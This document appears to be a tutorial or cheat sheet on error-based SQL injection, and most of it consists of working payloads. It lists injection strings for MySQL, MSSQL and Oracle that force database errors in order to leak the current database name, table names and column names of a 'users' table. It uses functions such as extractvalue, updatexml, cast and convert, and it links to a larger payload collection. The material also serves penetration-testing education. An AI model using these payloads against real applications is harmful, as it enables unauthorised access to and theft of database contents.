Error-Based SQL Injection is a technique where attackers intentionally cause database errors to reveal information. When an error message is returned in the server response, it can leak sensitive details about the database structure or content.

---

## 1. Basic Error-Based Injection

To test for SQL injection, you can deliberately introduce syntax errors or divide by zero:

```
' OR 1=1 -- (basic test)
' AND 1=CONVERT(int, 'text') -- (type conversion error)
' AND 1/0 -- (division by zero)
```

If the server returns an SQL error message, it confirms vulnerability.

---

## 2. Leveraging Error Messages to Extract Data

Databases like MySQL, MSSQL, and Oracle leak useful information through error messages. Attackers can abuse this behavior to reveal database details.

### MySQL Example (Using extractvalue()):

```
' AND extractvalue(1, concat(0x3a, (SELECT database()))) --
```

This query returns the current database name as part of an XML parsing error.

### MSSQL Example (Using cast()):

```
' AND 1=cast((SELECT TOP 1 table_name FROM information_schema.tables) AS int) --
```

The server returns an error showing the first table name from the database.

---

## 3. Useful Functions for Error-Based SQLi

|**Database**|**Function**|**Usage**|
|---|---|---|
|MySQL|`extractvalue()`|Leaks data in XML parsing errors|
|MySQL|`updatexml()`|Similar to `extractvalue()`|
|MSSQL|`convert()` / `cast()`|Converts data types to trigger errors|
|Oracle|`to_number()`|Converts string to number, causing errors if invalid|

Example for extracting current database in MSSQL:

```
' AND 1=CONVERT(int, (SELECT DB_NAME())) --
```

---

## 4. Extracting Sensitive Data via Errors

Once you know the technique works, you can refine your queries to leak more precise information.

You can find a vast collection of useful SQL injection payloads to use in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md). Here you have some examples:

- **Current database name:**
```
' AND (SELECT database()) -- (MySQL)
```

- **First table name:**
```
' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) -- (MSSQL)
```

- **First column name in a specific table:**

```
' AND updatexml(null, concat(0x3a, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)), null) -- (MySQL)
```